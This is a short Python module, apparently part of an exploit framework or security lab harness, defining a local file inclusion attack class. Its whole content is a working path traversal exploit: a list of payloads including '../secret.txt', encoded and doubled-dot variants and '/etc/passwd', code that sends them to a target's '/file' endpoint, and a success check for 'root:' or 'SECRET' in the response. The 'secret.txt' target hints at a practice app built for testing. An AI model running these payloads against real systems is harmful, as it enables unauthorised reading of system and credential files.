import requests
from .registry import Exploit, ExploitResult


class LocalFileInclusion(Exploit):
    id = "lfi_path_traversal"
    name = "Local File Inclusion"
    category = "lfi"
    description = "Reads arbitrary files via path traversal"
    payloads = [
        "../secret.txt",
        "....//....//secret.txt",
        "/etc/passwd",
        "..%2f..%2fsecret.txt",
    ]
    
    def execute(self, target_url: str, payload_index: int = 0) -> ExploitResult:
        payload = self.get_payload(payload_index)
        try:
            resp = requests.get(f"{target_url}/file", params={"file": payload})
            data = resp.json()
            return ExploitResult(
                success=self.check_success(data),
                response=data,
                payload_used=payload,
            )
        except requests.RequestException as e:
            return ExploitResult(
                success=False,
                response={},
                payload_used=payload,
                error=str(e),
            )
    
    def check_success(self, response: dict) -> bool:
        if response.get("status") != "File included":
            return False
        content = response.get("content", "")
        return "SECRET" in content or "root:" in content
